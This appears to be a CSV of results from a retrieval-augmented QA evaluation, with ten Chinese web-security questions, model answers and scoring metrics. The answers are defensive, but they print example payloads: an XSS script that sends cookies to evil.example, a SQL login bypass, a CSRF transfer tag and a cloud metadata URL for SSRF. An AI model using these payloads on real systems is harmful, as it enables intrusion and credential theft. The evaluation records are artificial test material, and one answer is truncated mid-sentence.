taskId,taskName,mode,itemId,question,answer,retrievalTimeMs,generationTimeMs,totalTimeMs,promptTokens,completionTokens,retrievalHit,precisionAtK,recallAtK,mrr,keywordHitRate,citationMatched,manualCorrectness,manualRelevance,manualCompleteness,manualHallucination,error
14,重排实验-Reranker-KB4,RAG_LLM,1,什么是 SQL 注入?如何防御?,"# SQL 注入原理与防御  ## 一、什么是 SQL 注入  **SQL 注入(SQL Injection, CWE-89)** 是一种将恶意 SQL 语句插入应用程序查询参数， 从而欺骗后端数据库执行非预期命令的攻击方式。它长期位居 OWASP Top 10 漏洞列表前列， 可能导致**数据泄露、数据篡改、认证绕过甚至服务器接管** [1]。  ## 二、攻击原理  当应用程序将用户输入直接拼接进 SQL 语句时， 攻击者可以构造特殊输入改变语句逻辑 [1]。以登录场景为例：  ```sql -- 拼接式查询(危险) SELECT * FROM users WHERE username = '输入1' AND password = '输入2' ```  若攻击者在用户名处输入 `admin' --`, 拼接后的语句变为：  ```sql SELECT * FROM users WHERE username = 'admin' --' AND password = '...' ```  `--` 之后的内容被注释， **密码校验被完全绕过** [1][5]。更严重的情况下， 攻击者可利用 `UNION SELECT` 读取任意表数据， 或利用数据库特性执行系统命令 [5]。  ## 三、常见攻击类型  1. **基于布尔的盲注**： 通过页面返回差异逐位猜测数据 [5] 2. **基于时间的盲注**： 利用 `SLEEP()` 等函数根据响应时间推断数据 [5] 3. **UNION 注入**： 利用 `UNION SELECT` 合并查询结果直接读取数据 [5] 4. **堆叠查询**： 分号后追加第二条语句(取决于数据库与驱动配置)[5]  ## 四、防御措施  ### 1. 参数化查询(首选)  使用预编译语句, 用户输入只作为数据绑定， 不参与 SQL 语法解析 [5]。  ### 2. ORM 框架规范使用  以 MyBatis 为例： **全部使用 `#{}`**, 动态排序字段用**白名单映射** [2]。  ### 3. 通用防御原则  SQL 注入的共同根因是“用户输入被拼接进解释型上下文”, 通用防御范式为 [3]:  - **优先使用无需拼接的安全 API**(即参数化) - 无法参数化时做**严格白名单校验** - **失败即拒绝**, 不做""过滤黑名单""式的修补 - **纵深防御**: 最小权限、隔离运行环境、监控告警 [3]  > 补充说明： SQL 注入并非孤立问题， 还需警惕同族的 LDAP、XML、模板注入等其他解释型上下文注入 [3](该部分属于命令注入文档中提及的关联知识)。",24831,25652,50483,1225,1449,1,0.4000,1.0000,1.0000,1.0000,1,0,0,0,0
14,重排实验-Reranker-KB4,RAG_LLM,2,MyBatis 中 #{} 和 ${} 的区别是什么?,"# MyBatis 中 `#{}` 与 `${}` 的区别  ## 核心区别  | 对比项 | `#{}` | `${}` | |--------|-------|-------| | 处理方式 | 参数化绑定(预编译) | 字符串直接拼接 | | SQL 语法解析 | 用户输入**不参与** SQL 语法解析，只作为数据绑定 [2] | 输入内容直接拼入 SQL 语句 | | 安全性 | 安全(首选方案) | 存在 SQL 注入风险，**严禁**用于拼接用户输入 [1] |  ## `#{}`:参数化绑定(安全)  `#{}` 会将参数作为占位符进行**预编译处理**，用户输入只作为数据绑定，不参与 SQL 语法解析，这是防御 SQL 注入的**首选方案** [2]。  ```xml <!-- 正确: 参数化 --> <select id=""findUser"">SELECT * FROM users WHERE id = #{id}</select> ```  其原理与 JDBC 的 `PreparedStatement` 一致，即先编译 SQL 骨架，再将用户输入作为纯数据填入 [2]。  ## `${}`:字符串拼接(危险)  `${}` 会将内容**直接拼接到 SQL 语句**中，若拼接的是用户可控输入，攻击者即可注入恶意 SQL 片段，产生注入漏洞 [1]：  ```xml <!-- 危险: 字符串拼接, 存在注入风险 --> <select id=""bad"">SELECT * FROM users ORDER BY ${column}</select> ```  ## 特殊场景：`ORDER BY` 动态排序字段  排序字段(如 `ORDER BY` 后的列名)属于 SQL 语法结构，**无法通过 `#{}` 参数化** [4]。此类场景的安全做法是**白名单映射**：只允许用户在预定义的安全选项中选择，而非直接拼接输入 [1][3][4]：  ```java private static final Map<String, String> ORDER_WHITE_LIST = Map.of(     ""createTime"", ""created_at"",     ""username"", ""username"" ); String column = ORDER_WHITE_LIST.getOrDefault(requestColumn, ""created_at""); ```  ## 实践建议  1. **默认规则**：MyBatis 中全部使用 `#{}` 进行参数绑定 [3] 2. **严禁**使用 `${}` 直接拼接用户输入 [1] 3. 动态排序字段等无法参数化的场景，一律使用**白名单映射**处理 [3][4]",609,16107,16716,1006,886,1,0.6000,1.0000,1.0000,1.0000,1,0,0,0,0
14,重排实验-Reranker-KB4,RAG_LLM,3,XSS 有哪几种类型?分别如何防御?,"# XSS 的类型与防御  ## 一、XSS 的三种类型  根据知识库,XSS(Cross-Site Scripting,CWE-79)是指攻击者向 Web 页面注入恶意脚本,当其他用户浏览页面时脚本在受害者浏览器中执行,可用于窃取会话 Cookie、篡改页面、发起钓鱼或键盘记录等攻击 [1]。其分为三种类型 [1]:  | 类型 | 特征 | 典型场景 | |------|------|----------| | **反射型 XSS** | 恶意脚本来自用户请求参数,服务器将其""反射""回响应页面 | 搜索结果页 | | **存储型 XSS** | 恶意脚本被持久化存储到数据库,**所有访问者都会执行,危害最大** | 评论、个人简介 | | **DOM 型 XSS** | 由前端 JavaScript 不当操作 DOM 引起(如 `innerHTML` 写入未净化的 URL 参数),数据**不经过服务器** | 前端单页应用 |  攻击示例——评论功能未过滤输出时,攻击者提交 [1]:  ```html <script>fetch('https://evil.example/steal?c=' + document.cookie)</script> ```  ## 二、防御方案  ### 1. 知识库中有依据的防御措施  - **敏感凭证改用 HttpOnly Cookie 存储**:localStorage 易受 XSS 窃取,而 HttpOnly Cookie 天然防 XSS 窃取(但需配套 CSRF 防御)[3][4]。这能在 XSS 被绕过时降低会话 Cookie 被窃取的损失。 - **修复 XSS 是 CSRF 防御的前置条件**:XSS 脚本可以读取页面中的 CSRF Token,从而绕过 Token 防御 [2],因此必须优先治理 XSS。 - **通用注入防御范式**:XSS 与路径穿越、命令注入的共同根因是""用户输入被拼接进解释型上下文""[5],可套用以下原则 [5]:   1. 优先使用无需拼接的安全 API(如避免用 `innerHTML` 拼接用户输入,参见 DOM 型 XSS 的成因 [1]);   2. 无法参数化时做严格**白名单校验**;   3. **失败即拒绝**,不做""过滤黑名单""式的修补;   4. **纵深防御**:最小权限、隔离运行环境、监控告警 [5]。  ### 2. 知识库补充说明  当前知识库片段中,XSS 防护指南 [1] 仅包含概念、分类与攻击示例,未提供输出编码、CSP 等具体防御章节的完整内容。以下为**通用安全常识补充,无知识库引用**,供学习参考:  - **输出编码**:在数据输出到 HTML、JavaScript、URL、CSS 等不同上下文时,分别做对应的编码转义(如 HTML 实体编码),这是 XSS 防御的核心手段。 - **使用安全的 DOM API**:前端用 `textContent` 代替 `innerHTML` 插入不可信数据。 - **输入净化**:确需渲染富文本时,使用成熟净化库(如 DOMPurify)过滤危险标签与属性。 - **配置 CSP**:`Content-Security-Policy` 响应头限制脚本来源,即使注入成功也难以执行。 - **模板引擎自动转",416,38778,39195,1472,2048,1,0.2000,1.0000,1.0000,1.0000,1,0,0,0,0
14,重排实验-Reranker-KB4,RAG_LLM,4,CSRF 攻击的原理是什么?有哪些防御手段?,"# CSRF 攻击原理与防御手段  ## 一、什么是 CSRF  跨站请求伪造(Cross-Site Request Forgery, CWE-352)是指攻击者诱导**已登录用户**的浏览器，在用户不知情的情况下向目标站点发送恶意请求。由于请求自动携带了用户的合法会话凭证(如 Cookie),服务器难以区分这是否为用户本人意愿，从而以用户身份执行了操作 [1]。  ## 二、攻击原理  **典型场景**：用户已登录 `bank.example`,会话 Cookie 仍然有效。攻击者在第三方页面埋入恶意代码：  ```html <img src=""https://bank.example/transfer?to=attacker&amount=10000""> ```  用户访问该页面时，浏览器自动携带 Cookie 发起转账请求，攻击完成 [1]。  **攻击成立的三个关键条件** [1]:  1. 受害者在目标站点持有有效会话 2. 目标操作仅需 Cookie 即可认证，无二次确认 3. 攻击者能诱导受害者访问恶意页面  ## 三、防御手段  ### 1. CSRF Token(主流方案)  服务器为每个会话生成随机 Token,嵌入表单或请求头；请求到达时校验 Token 是否匹配。攻击者无法跨站读取该 Token,伪造请求即告失败 [2]。  ```html <form method=""post"" action=""/transfer"">  <input type=""hidden"" name=""_csrf"" value=""随机Token"">  ... </form> ```  > Spring Security 默认启用 CsrfFilter,对非幂等请求(POST/PUT/DELETE)校验 `_csrf` 参数或 `X-CSRF-TOKEN` 头 [2]。  ### 2. SameSite Cookie  利用现代浏览器支持的 SameSite 属性，限制 Cookie 在跨站请求中发送 [2]:  ``` Set-Cookie: SESSIONID=xxx; SameSite=Lax; Secure; HttpOnly ```  - `Strict`:完全不跨站发送 - `Lax`:导航级 GET 请求允许携带(浏览器默认)[2][3]  ### 3. 校验 Origin 与 Referer  对敏感请求检查 `Origin`/`Referer` 头是否为本站域名，拒绝来源不明的跨站请求 [3]。  ### 4. 避免 GET 产生副作用  严格遵守 HTTP 语义：查询用 GET,修改用 POST/PUT/DELETE,从根源上杜绝 img/script 标签型 CSRF [3]。  ### 5. 二次认证  对转账、改密、删除等高危操作要求再次输入密码、验证码或动态口令 [3]。  ## 四、补充：CSRF 与 XSS 的关系及注意事项  - **区别**:CSRF 利用服务器对浏览器的信任，攻击的是“用户身份”；XSS 利用站点对输出的信任，攻击的是“浏览器执行环境” [3]。 - **联动风险**：XSS 通常可以用来绕过 CSRF Token 防御(脚本可读取 Token),因此**修复 XSS 是 CSRF 防御的前置条件** [3]。  在前后端分离项目中，若使用 JWT 并存储于 localStorage,需配套严格的 XSS 防御；若使用 HttpOnly Cookie 存储凭证，则天然防 XSS 窃取，但需配套 CSRF 防御 [4]。此外，会话过期与轮换也是身份认证安全的重要环节 [5]。  ---  **防御建议总结**：实际项目中通常采用**纵深防御**策略——以 CSRF Token 为主，SameSite Cookie 与 Origin 校验为辅，高危操作叠加二次认证，同时做好 XSS 防护以避免 Token 被窃取。",657,14889,15547,1484,904,1,0.6000,1.0000,1.0000,1.0000,1,0,0,0,0
14,重排实验-Reranker-KB4,RAG_LLM,5,SSRF 是什么?云环境中最典型的危害是什么?,"## 一、SSRF 是什么  **SSRF(服务端请求伪造,Server-Side Request Forgery,CWE-918)** 是指攻击者诱使服务器端应用向攻击者指定的地址发起请求 [2]。由于请求是由内网服务器发出的,攻击者可借此：  - 探测内网 - 访问内网服务 - 读取云平台元数据 - 甚至借助内网管理接口控制服务器 [2]  在 OWASP Top 10 (2021) 中被列为 **A10:2021**,在 OWASP API 安全 Top 10 中对应 **API7: SSRF** [3][4]。  ## 二、常见攻击手法(简要)  1. **内网探测**：通过返回差异或超时时间推断内网主机与端口存活情况 [2] 2. **协议滥用**：利用 `file://` 读取本地文件,利用 `gopher://`、`dict://` 等协议构造任意报文 [2] 3. **绕过技巧**：使用十进制 IP、短链接、DNS 重绑定、`0.0.0.0`、`[::1]` 等绕过黑名单校验 [2]  ## 三、云环境中最典型的危害：云元数据泄露  在云环境中,最典型的危害是**通过 SSRF 请求元数据服务获取实例凭证,进而接管云资源**:  > 攻击者可请求 `http://169.254.169.254/latest/meta-data/` 获取实例凭证,进而**接管云资源** [2]  其危害链条为:SSRF 漏洞 → 访问元数据服务(169.254.169.254)→ 窃取实例临时凭证 → 以该实例身份接管云上资源(如对象存储、数据库等)。  ## 四、针对性防御建议  针对云元数据泄露这一典型危害,知识库给出的核心防御措施包括:  - **解析后校验真实 IP**:将域名解析为 IP 后,校验其是否属于内网段(包括 `169.254.0.0/16` 链路本地地址等),并防范 DNS 重绑定 [1] - **网络层隔离**:云环境中**禁用或加固元数据服务(如启用 IMDSv2)**,并将发起外联请求的服务部署在独立网段,通过防火墙限制其只能访问白名单出口 [1] - **禁用危险协议**:仅允许 `http`/`https`,拒绝 `file`、`gopher`、`dict`、`ftp` 等 [1] - **限制重定向**:禁止自动跟随重定向,防止重定向绕过首次校验 [1] - **检测手段**:代码审计关注""服务端主动请求用户指定 URL""的功能,对外联目标进行流量监控告警,并使用带外检测(OAST)平台验证盲 SSRF [1]  **总结**:SSRF 是让""服务器替攻击者发请求""的漏洞;在云环境中其最典型的危害是窃取元数据服务中的实例凭证,导致云资源被接管,因此启用 IMDSv2、校验解析后 IP、网络隔离是最关键的防御组合 [1][2]。",572,21695,22268,1660,920,1,0.4000,1.0000,1.0000,1.0000,1,0,0,0,0
14,重排实验-Reranker-KB4,RAG_LLM,6,JWT 常见的安全风险有哪些?,"# JWT 常见安全风险  根据知识库内容, JWT 常见安全风险主要有以下五类:  ## 1. 算法混淆攻击 [1]  - **原理**: 服务端若信任 Token Header 中声明的签名算法, 攻击者可将 `alg` 改为 `none`, 或将非对称算法 RS256 篡改为 HS256(用公钥当作 HMAC 密钥), 从而伪造出合法签名。 - **防御**: 服务端硬编码固定算法, 不从 Token 中读取算法声明。  ## 2. 密钥强度不足与硬编码 [2]  - **原理**: 弱密钥(如 `secret`、`123456`)可被暴力破解; 硬编码在源码中的密钥一旦泄露即全面失守。 - **防御**: 密钥仅通过环境变量或密钥管理服务注入, 长度不低于 256 位。  ## 3. 敏感信息泄露 [2]  - **原理**: Payload 仅做 Base64 编码, 内容明文可读, 任何人拿到 Token 即可解码查看。 - **防御**: 严禁在 Payload 中存放密码、手机号等敏感数据。  ## 4. Token 无法主动失效 [2]  - **原理与危害**: JWT 是无状态的, 签发后在过期前始终有效。用户改密、注销或账号被盗时, 旧 Token 依然可用, 无法像传统 Session 一样直接销毁。 - **防御**:   - 引入服务端黑名单机制(如 Redis);   - 缩短有效期并配合刷新令牌(Refresh Token);   - 在签名中加入版本号, 随密钥变更而使旧 Token 失效。  ## 5. 存储位置风险 [2]  | 存储方式 | 风险 | 配套防御 | |---------|------|---------| | localStorage | 易受 XSS 攻击窃取 | 需配套严格的 XSS 防御 | | HttpOnly Cookie | 天然防 XSS 窃取 | 需配套 CSRF 防御 |  ---  **总结**: JWT 的核心风险集中在""算法信任、密钥管理、Payload 可读性、无状态失效难题、客户端存储""五个方面, 防御思路是**服务端固定算法、强化密钥管理、Payload 最小化、建立失效机制、合理选择存储方式并配套对应防护**。",666,19828,20494,1440,1196,1,0.4000,1.0000,1.0000,0.6000,1,0,0,0,0
14,重排实验-Reranker-KB4,RAG_LLM,7,文件上传功能有哪些安全风险?如何防范?,"# 文件上传功能的安全风险与防范  ## 一、主要安全风险  根据知识库，文件上传功能是 Web 攻击的高发入口，主要风险包括以下五类 [1]：  | 风险类型 | 说明 | |---------|------| | **WebShell 上传** | 上传可执行脚本(如 `shell.jsp`、`shell.php`),攻击者可直接获得服务器控制权 [1] | | **目录穿越** | 利用 `../../` 将文件写到任意路径，覆盖关键配置 [1] | | **存储型 XSS** | 上传含脚本的 HTML/SVG 文件，被浏览器直接渲染后触发 [1] | | **拒绝服务(DoS)** | 上传超大文件或畸形压缩包，耗尽磁盘与内存资源 [1] | | **恶意文件分发** | 服务器被当作恶意文件中转站 [1] |  ---  ## 二、防御措施  ### 1. 严格校验文件类型(白名单) [1]  - 校验**扩展名白名单**(如仅允许 pdf、txt、md、docx),拒绝一切可执行扩展名 - 校验**文件头**防正仅修改扩展名的绕过；但需注意伪造文件头的风险，白名单 + 头校验需配合使用 - 使用**成熟解析库**读取内容，拒绝解析失败或内容异常的文件  ### 2. 重命名存储与路径安全 [1][2]  - 文件名由服务端生成**随机名**，或使用 `Path.getFileName()` 处理，不接受用户提供的路径 [2] - **白名单校验文件名字符集**，仅允许字母数字与少量安全符号 [2] - 运行账号遵循**最小权限**原则，限制可访问目录 [2] - Web 服务器层拒绝包含 `..` 的请求，形成多层防御 [2]  ### 3. 限制文件大小 [5]  - 应用层限制单文件大小(如 50MB) - Web 服务器层限制请求体大小(nginx `client_max_body_size`) - 设置上传**频率与配额限制**，防止滥用  ### 4. 隔离存储 [5]  - 上传目录**不赋予执行权限**(防止 WebShell 落地执行) - 静态资源通过**单独域名/CDN** 提供，与应用域隔离 - 下载时设置 `Content-Disposition: attachment` 与正确的 `Content-Type`(防止浏览器直接渲染触发 XSS)  ### 5. 内容检测 [5]  - 对文档进行**病毒扫描** - 对图片**重新编码**(消解隐写与内嵌脚本) - 对 PDF/Office 文档，解析失败即拒绝  ### 6. 前后端双重校验 [3]  - 前端上传前校验大小与类型，属于**体验层**优化 - **服务端必须重复校验**，这才是真正的安全层  ``` 前端校验(体验层) ──→ 服务端校验(安全层,必须) ```  ### 7. 特殊场景：RAG 知识库系统 [5]  若上传文档用于“解析 → 清洗 → 分块 → 向量化”流水线，还需：  1. 白名单限制为可解析的文档类型(PDF/TXT/MD/DOCX) 2. 解析失败时标记文档状态为 FAILED 并记录原因，**不中断服务** 3. 文件内容仅用于向量化检索，原文件**不直接暴露下载 URL**,需要时经鉴权接口返回  ---  ## 三、小结  文件上传防御的核心思路是**纵深防御**：类型白名单 + 随机重命名 + 大小限制 + 存储隔离 + 内容检测多层配合，且任何校验都必须以**服务端为准**，前端校验仅作为体验优化 [1][2][3][5]。",618,25882,26500,1380,1291,1,0.4000,1.0000,1.0000,0.7500,1,0,0,0,0
14,重排实验-Reranker-KB4,RAG_LLM,8,BOLA 和 BFLA 的区别是什么?,"# BOLA 与 BFLA 的区别  ## 一句话总结  - **BOLA(对象级授权失效)**：校验的是“这个**数据对象**是不是你的”，防止**横向越权**(访问同级用户的资源)[1][2] - **BFLA(功能级授权失效)**：校验的是“你有没有权限执行这个**功能**”，需要**逐功能校验角色**，防止普通用户调用管理类等高权限接口[2][3]  ## 详细对比  | 维度 | BOLA(对象级授权失效) | BFLA(功能级授权失效) | |------|----------------------|----------------------| | 防护对象 | 数据对象(发票、订单等资源) | 功能/接口(尤其是管理功能) | | 典型攻击方式 | 横向越权：只验证""你是谁""(认证)，不验证""这个对象是不是你的""(授权)[1] | 角色权限绕过：未逐功能校验角色，管理接口暴露被低权限用户调用[2][3] | | 典型示例 | `GET /api/invoices/5002` 用户 A 查看用户 B 的发票，无归属校验时同样返回 200[1] | 普通用户直接调用管理功能接口[3] | | 防御措施 | 每次数据访问都把“归属”写进查询条件，服务端逐对象校验归属[1][2] | 逐功能校验角色[2] | | OWASP 地位 | BOLA 是 OWASP API Security Top 10 之首，也是数据泄露事件的最主要根因[1] | 旧版 API5(功能级授权失效)在 2023 版中拆分并入 BFLA 与 BOLA 相关条目[3] |  ## BOLA 的高发场景 [1]  1. 自增整数主键暴露，易于遍历(5001 → 5002 → ...) 2. UUID 被误认为“不可猜测即安全”(一旦泄露仍可越权) 3. 批量接口、导出接口、子资源路径(`/users/{id}/orders`)遗漏校验 4. 导航/回退接口复用了宽权限查询  ## 防御要点  - **BOLA**:服务端**逐对象校验归属**，将资源归属条件写入查询[1][2] - **BFLA**:服务端**逐功能校验角色**[2] - **代码评审时**，应对每个新接口检查是否同时覆盖了 BOLA 与 BFLA 两类授权校验 [4]  ## 补充说明(通用知识，无知识库引用)  知识库中未直接使用“垂直越权”一词描述 BFLA,但结合其“逐功能校验角色”“管理功能接口暴露”的表述，BFLA 通常对应**垂直越权**(低权限用户执行高权限功能)，而 BOLA 对应**横向越权**(同级用户互访数据)，这一术语对应关系属于通用安全常识。",360,29843,30204,1400,1368,1,0.2000,1.0000,1.0000,1.0000,1,0,0,0,0
14,重排实验-Reranker-KB4,RAG_LLM,9,为什么不能使用 MD5 存储密码?应该用什么?,"# 为什么不能使用 MD5 存储密码？  ## 一、MD5 存储密码的风险  ### 1. 快速哈希, 极易被破解 MD5/SHA1 属于**快速哈希算法**, 设计目标是快速计算数据摘要, 而非抵抗密码破解。攻击者可通过**彩虹表**与**暴力破解**轻易还原密码, 因此被安全实践明确列为危险方案 [2]。Spring Boot 安全加固指南也明确要求禁止使用 MD5/SHA1 明文级方案 [1]。  ### 2. 加盐 MD5 也无济于事 有人认为“加盐 MD5”可以解决上述问题, 但实践证明其安全性依然**不足** [2]: - 盐通常与哈希值一同存储在数据库中, 一旦**拖库, 盐与哈希一同泄露**, 防护作用大幅下降; - MD5 计算速度极快, 攻击者借助 GPU **每秒可计算数十亿次**哈希, 即使逐个盐值尝试穷举也不困难 [2]。  ## 二、应该用什么？—— 慢哈希方案  ### 1. 推荐算法 知识库明确推荐 **PBKDF2 / BCrypt / Argon2** 三类方案, 其共同特点是 [2]: - **自适应慢哈希 + 盐**: 故意拉长单次计算时间, 抬高破解成本; - **成本参数可调**: 可随硬件性能升级而调大, 长期保持破解成本。  ### 2. BCrypt 的核心优势 BCrypt 基于 Blowfish 改造, 具备三大特点 [2]: 1. **自带随机盐**: 相同密码每次哈希结果不同, 天然抗彩虹表; 2. **成本因子可调**: 哈希轮数为 2^cost, 可随硬件进步调大; 3. **输出自包含**: 哈希串 `$2a$10$N9qo8uLOickgx2ZMRZoMye...` 内含算法版本、成本因子、盐与哈希值, 校验时直接解析, 无需单独存盐。  推荐成本因子为 **10-12**（每次哈希约 60-250ms）[2]。  ### 3. Spring Boot 中的落地示例 ```java @Bean public PasswordEncoder passwordEncoder() {     return new BCryptPasswordEncoder(); // 默认强度 10 }  // 注册 String hash = passwordEncoder.encode(rawPassword);  // 登录校验 boolean ok = passwordEncoder.matches(rawPassword, storedHash); ``` 即注册时仅存储 `encode()` 生成的哈希, 登录时用 `matches()` 比对, 全程不接触明文 [1]。  ## 三、方案对比总结  | 方案 | 安全性 | 结论 | |------|--------|------| | 明文 | 危险 | 泄露即直接暴露 [2] | | MD5/SHA1 | 危险 | 快速哈希, 彩虹表与暴力破解极易 [2] | | 加盐 MD5 | 不足 | 盐可被一同拖库, GPU 破解成本低 [2] | | PBKDF2/BCrypt/Argon2 | 推荐 | 慢哈希+盐, 成本可随硬件升级 [2] |  **结论**: 不用 MD5 的根本原因在于其“快”和“固定输出”特性使密码可被低成本穷举; 应改用 BCrypt 等自适应慢哈希算法, 并配合合理成本因子（10-12）存储密码 [1][2]。",701,20750,21451,1504,1150,1,0.4000,1.0000,0.5000,1.0000,1,0,0,0,0
14,重排实验-Reranker-KB4,RAG_LLM,10,RAG 系统的完整流程是什么?,"# RAG 系统的完整流程  ## 一、总体架构  RAG(Retrieval-Augmented Generation, 检索增强生成)采用 **“先检索、后生成”的两阶段架构** 增强大语言模型， 旨在缓解 LLM 的三大缺陷： 知识截止、幻觉、私域知识缺失 [1]。整体分为 **离线索引阶段** 与 **在线问答阶段** 两条主线 [1]。  ## 二、离线索引阶段  该阶段将原始文档转化为可检索的向量知识库， 流程依次为 [1][2]:  1. **文档解析**： 提取 PDF/TXT/MD/DOCX 等文档的文本内容 [1] 2. **清洗**： 去除控制字符、页眉页脚、乱码等噪声 [1] 3. **分块(Chunking)**: 按语义边界与固定长度切分为 chunk, 通常 **256–1024 字符**， 相邻块保留重叠以保持语义连贯 [1] 4. **向量化(Embedding)**: 使用 Embedding 模型将每个 chunk 映射为稠密向量 [1] 5. **入库**： 向量与原文、元数据(文档名、页码、块序号)一同存入向量数据库 [1]  知识库片段 [2] 也印证了该流水线顺序： 上传的文档会经过 **“解析 → 清洗 → 分块 → 向量化”** 流水线处理 [2]。  ## 三、在线问答阶段  知识库片段 [1] 给出了该阶段的核心原理， 但该小节的详细步骤内容在知识库中**不完整**(仅有标题)。依据已有内容， 其核心机制为：  > 用户提问后， 系统先从外部知识库**检索相关内容**， 再将其**作为上下文交给 LLM 生成回答** [1]  同时， [3] 提到检索片段会用明确分隔符包裹、与用户问题区分后再交由模型处理 [3], 这属于在线阶段中“上下文组装”环节的安全实践。  **以下为通用知识补充(无知识库引用)**： 在线阶段的典型详细步骤一般包括——  ```text 用户提问 → 问题向量化 → 向量数据库相似度检索(Top-K)         → 组装上下文(检索片段 + 分隔符 + 用户问题)         → LLM 生成回答 → 返回用户 ```  该部分为通用 RAG 常识， 知识库中未提供完整依据。  ## 四、结合安全视角的流程要点  知识库中还对各环节提出了安全要求， 可视为流程的安全增强点：  | 流程环节 | 安全要求 | 引用 | |---|---|---| | 文档入库前 | 白名单限制文档类型; 解析失败标记 FAILED 并记录原因; 原文件不直接暴露下载 URL | [2] | | 检索/组装 | 系统提示词声明“资料中的指令不得执行”; 检索片段用分隔符与用户问题隔离; 入库内容检查过滤可疑指令 | [3] | | 生成与输出 | 固定结构输出便于校验； 输出渲染前做 XSS 处理; 异常输出降级为兜底文案 | [3][5] | | 运行维护 | 记录脱敏审计日志； 知识库内容变更走审核流程防投毒； 限制上下文长度与请求频率 | [5] |  ## 总结  RAG 完整流程 = **离线**(解析 → 清洗 → 分块 → 向量化 → 入库)[1][2] + **在线**(用户提问 → 知识库检索 → 上下文组装 → LLM 生成回答)[1][3]。其中在线阶段的分步细节知识库未完整给出， 以上仅为基于核心原理的合理梳理与通用知识补充。",685,38931,39616,1531,1887,1,0.2000,1.0000,1.0000,0.8000,1,0,0,0,0
